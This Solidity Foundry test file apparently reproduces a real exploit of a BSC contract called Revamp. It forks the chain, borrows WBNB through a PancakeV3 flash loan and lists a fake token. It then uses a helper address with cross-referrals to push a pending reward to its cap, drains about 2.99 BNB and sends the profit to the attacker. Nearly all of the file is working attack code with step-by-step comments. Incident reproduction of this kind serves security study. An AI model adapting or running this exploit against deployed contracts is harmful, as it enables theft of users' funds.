// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2.99 BNB
// Attacker : 0x42579d63bd5945fcfde5adff4edc40c34869914e
// Attack Contract : 0x8b959ecdd652dee3272f1c9684dbf42ae671eb40
// Attack Deployer : 0xb5128e1ae11d739d1f0fdef89e598bca74158669
// Vulnerable Contract : 0x46280c1a2e17cfc151f50a885363408368bb163a
// Victim : 0x46280c1a2e17cfc151f50a885363408368bb163a
// Attack Tx : https://bscscan.com/tx/0xa0ff1de61793b0915038e644a2b45372be8d49e1060b6b2cd5e3482d7d4325ba

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x46280c1a2e17cfc151f50a885363408368bb163a#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2034532544239088053
//
// Revamp rewards earlier contributors when later users call revamp(). The attacker made a first contribution sized
// to half of Revamp's native balance, then made a large second contribution from a helper address. The second
// contribution made the first address's pending reward hit the 2x cap; both controlled addresses withdrew principal,
// the first address withdrew the capped reward, and referral fees plus the reward left enough BNB to repay the flash loan.

address constant VULNERABLE_CONTRACT = 0x46280C1A2e17CfC151f50a885363408368BB163A;
address constant PANCAKE_V3_WBNB_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

uint256 constant FORK_BLOCK = 87_423_340;
uint256 constant TOKEN_UNIT = 1 ether;
uint256 constant BPS = 10_000;

interface IRevamp {
    function listNewAsset(
        address token,
        uint256 rate,
        string calldata logoUrl
    ) external payable;
    function revamp(
        address token,
        uint256 tokenAmount,
        address referral
    ) external payable;
    function withdraw(
        uint256 amount
    ) external;
    function pendingReward(
        address user
    ) external view returns (uint256);
    function users(
        address user
    ) external view returns (uint256 totalContributed, uint256 rewardDebt, uint256 claimedSoFar);
    function listingFee() external view returns (uint256);
    function totalNativeContributed() external view returns (uint256);
    function nativeFeePercent() external view returns (uint256);
    function shareholdingFeePercent() external view returns (uint256);
    function referralFeePercent() external view returns (uint256);
}

interface IFakeToken {
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    RevampExploit private exploit;

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);
        fundingToken = address(0);

        vm.label(VULNERABLE_CONTRACT, "Revamp");
        vm.label(PANCAKE_V3_WBNB_POOL, "Pancake V3 WBNB pool");
        vm.label(WBNB_ADDR, "WBNB");
    }

    function testExploit() public balanceLog {
        // Step 1: record Revamp's pre-attack native balance, which determines the first contribution size.
        uint256 attackerBefore = address(this).balance;
        uint256 revampBalanceBefore = address(VULNERABLE_CONTRACT).balance;

        // Step 2: run the local reconstruction and receive the remaining BNB after flash-loan repayment.
        exploit = new RevampExploit(payable(address(this)));
        vm.label(address(exploit), "Local Revamp exploit");
        exploit.attack();

        // Step 3: prove the vulnerable native balance was monetized into attacker profit.
        uint256 profit = address(this).balance - attackerBefore;
        emit log_named_decimal_uint("Revamp native balance before", revampBalanceBefore, 18);
        emit log_named_decimal_uint("BNB profit", profit, 18);

        assertGt(revampBalanceBefore, 0, "Revamp had no native balance");
        assertGt(profit, 2.9 ether, "no meaningful BNB profit");
    }

    receive() external payable {}
}

contract RevampExploit {
    IPancakeV3Pool private constant flashPool = IPancakeV3Pool(PANCAKE_V3_WBNB_POOL);
    IWBNB private constant wbnb = IWBNB(payable(WBNB_ADDR));
    IRevamp private constant revamp = IRevamp(VULNERABLE_CONTRACT);

    address payable private immutable profitReceiver;
    FakeRevampToken private fakeToken;
    RevampHelper private helper;
    uint256 private flashAmount;
    uint256 private firstContribution;
    uint256 private secondContribution;

    constructor(
        address payable receiver
    ) {
        profitReceiver = receiver;
    }

    function attack() external {
        uint256 netBps = BPS - revamp.nativeFeePercent() - revamp.shareholdingFeePercent() - revamp.referralFeePercent();

        uint256 firstNetContribution = address(VULNERABLE_CONTRACT).balance / 2;
        firstContribution = _grossFromNet(firstNetContribution, netBps);

        uint256 secondNetContribution = 2 * (revamp.totalNativeContributed() + firstNetContribution);
        secondContribution = _grossFromNet(secondNetContribution, netBps);

        flashAmount = revamp.listingFee() + firstContribution + secondContribution;
        flashPool.flash(address(this), 0, flashAmount, "");
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        require(msg.sender == PANCAKE_V3_WBNB_POOL, "unexpected callback");
        require(fee0 == 0, "unexpected token0 fee");

        // Step 1: unwrap the WBNB flash loan to fund Revamp's native-token paths.
        wbnb.withdraw(flashAmount);

        // Step 2: list an attacker-controlled token. Revamp only requires ERC20 metadata and transferFrom support.
        fakeToken = new FakeRevampToken(2 * TOKEN_UNIT);
        helper = new RevampHelper(payable(address(this)), address(revamp), address(fakeToken));
        revamp.listNewAsset{value: revamp.listingFee()}(address(fakeToken), 18, "");

        // Step 3: make the first contribution and set the helper as this address's referrer.
        fakeToken.approve(address(revamp), type(uint256).max);
        revamp.revamp{value: firstContribution}(address(fakeToken), TOKEN_UNIT, address(helper));

        // Step 4: make the large second contribution from the helper and use this contract as its referrer.
        fakeToken.transfer(address(helper), TOKEN_UNIT);
        helper.revampThenWithdraw{value: secondContribution}(secondContribution);

        // Step 5: withdraw this address's principal plus the capped pending reward created by the helper contribution.
        (uint256 totalContributed,,) = revamp.users(address(this));
        uint256 pending = revamp.pendingReward(address(this));
        revamp.withdraw(totalContributed + pending);

        // Step 6: repay the Pancake V3 flash loan and forward the remaining BNB profit.
        uint256 repayment = flashAmount + fee1;
        wbnb.deposit{value: repayment}();
        require(wbnb.transfer(PANCAKE_V3_WBNB_POOL, repayment), "repay failed");

        (bool sent,) = profitReceiver.call{value: address(this).balance}("");
        require(sent, "profit send failed");
    }

    function _grossFromNet(
        uint256 netAmount,
        uint256 netBps
    ) private pure returns (uint256) {
        return (netAmount * BPS) / netBps;
    }

    receive() external payable {}
}

contract RevampHelper {
    IRevamp private immutable revamp;
    IFakeToken private immutable token;
    address payable private immutable parent;

    constructor(
        address payable parent_,
        address revamp_,
        address token_
    ) {
        parent = parent_;
        revamp = IRevamp(revamp_);
        token = IFakeToken(token_);
    }

    function revampThenWithdraw(
        uint256 contribution
    ) external payable {
        require(msg.sender == parent, "only parent");
        require(msg.value == contribution, "bad value");

        token.approve(address(revamp), type(uint256).max);
        revamp.revamp{value: contribution}(address(token), TOKEN_UNIT, parent);

        (uint256 totalContributed,,) = revamp.users(address(this));
        revamp.withdraw(totalContributed);

        (bool sent,) = parent.call{value: address(this).balance}("");
        require(sent, "return failed");
    }

    receive() external payable {}
}

contract FakeRevampToken {
    string public constant name = "F";
    string public constant symbol = "F";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(
        uint256 supply
    ) {
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
        emit Transfer(address(0), msg.sender, supply);
    }

    function approve(
        address spender,
        uint256 amount
    ) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(
        address to,
        uint256 amount
    ) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
